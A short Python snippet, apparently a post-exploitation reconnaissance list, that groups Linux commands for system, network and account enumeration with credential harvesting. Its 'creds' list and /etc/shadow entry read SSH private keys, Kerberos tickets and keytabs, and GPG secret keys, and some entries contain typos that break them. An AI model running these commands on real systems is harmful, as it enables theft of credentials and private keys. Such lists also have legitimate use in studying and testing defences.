

blind_files = ['cat /etc/resolv.conf', '/etc/motd', 'cat /etc/issue','cat /etc/passwd','cat /etc/shadow']

system_cmd = ['uname -a', 'ps aux', 'top -n 1 -d','id','python --version']

networking = ['hosname -f','ifconfig','ip route', 'netstat -tulpn','arp -a']

user_accounts = ['getent passwd','getent group','find /etc -name aliases','cat /etc/security/passwd']

creds = ['cat /home/*/.ssh/id*', 'cat /tmp/krb5cc_*', 'cat /tmp/krb5.keytab','cat /home/*/.gnugp/secring.gpgs']

